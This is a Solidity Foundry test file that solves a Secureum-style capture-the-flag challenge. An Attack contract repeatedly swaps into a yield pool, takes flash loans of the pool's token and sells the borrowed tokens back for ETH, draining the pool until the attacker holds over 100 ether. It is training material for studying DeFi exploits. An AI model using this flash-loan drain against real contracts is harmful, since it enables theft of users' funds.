// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

//
//  return numerator / denominator;
//  numerator = inputAmountWithFee * _outputReserve;
//  denominator = (_inputReserve * 100) + inputAmountWithFee;
//  inputAmountWithFee = _inputAmount * 99;
//  _outputReserve = tokenReserve
//  nuumerator = _inputAmount * 99 * tokenReserve
//  denominator = (_inputReserve * 100) + _inputAmount * 99;
// _inputAmount * 99 * tokenReserve / (_inputReserve * 100) + _inputAmount * 99;
// x * r < ir * 100 + x
// r < (ir * 100) / (x*99) + 1
// r < ir/x * 100/99 + 1

// function getAmountOfTokens(uint256 _inputAmount, uint256 _inputReserve, uint256 _outputReserve)
//     public
//     pure
//     returns (uint256)
// {
//     require(_inputReserve > 0 && _outputReserve > 0, "invalid reserves");
//     uint256 inputAmountWithFee = _inputAmount * 99;
//     uint256 numerator = inputAmountWithFee * _outputReserve;
//     uint256 denominator = (_inputReserve * 100) + inputAmountWithFee;
//     return numerator / denominator;
// }

// /**
//  * @dev Swap ETH to TOKEN
//  * @notice Provided ETH will be sold for TOKEN
//  */
// function ethToToken() public payable {
//     uint256 tokenReserve = getReserve();
//     uint256 tokensBought = getAmountOfTokens(msg.value, address(this).balance - msg.value, tokenReserve);

//     TOKEN.transfer(msg.sender, tokensBought);
// }

contract Attack is IERC3156FlashBorrower {
    YieldPool public yieldPool;
    SecureumToken public token;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address public owner;

    bytes32 private constant _CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(YieldPool _yieldPool, SecureumToken _token, address _owner) {
        yieldPool = _yieldPool;
        token = _token;
        owner = _owner;
    }

    function attack() external {
        do {
            yieldPool.ethToToken{value: 0.1 ether}();
            yieldPool.flashLoan(
                IERC3156FlashBorrower(address(this)), address(token), yieldPool.getReserve() / 10000, bytes("")
            );
        } while (address(this).balance < 100 ether);
        payable(owner).transfer(address(this).balance);
    }

    function onFlashLoan(address, address loanedToken, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        token.approve(address(yieldPool), type(uint256).max);
        yieldPool.tokenToEth(token.balanceOf(address(this)));
        return _CALLBACK_SUCCESS;
    }

    receive() external payable {}
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/

        Attack attack = new Attack(yieldPool, token, attacker);

        payable(address(attack)).transfer(0.1 ether);

        attack.attack();

        //==================================================//
        vm.stopPrank();

        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
    }
}
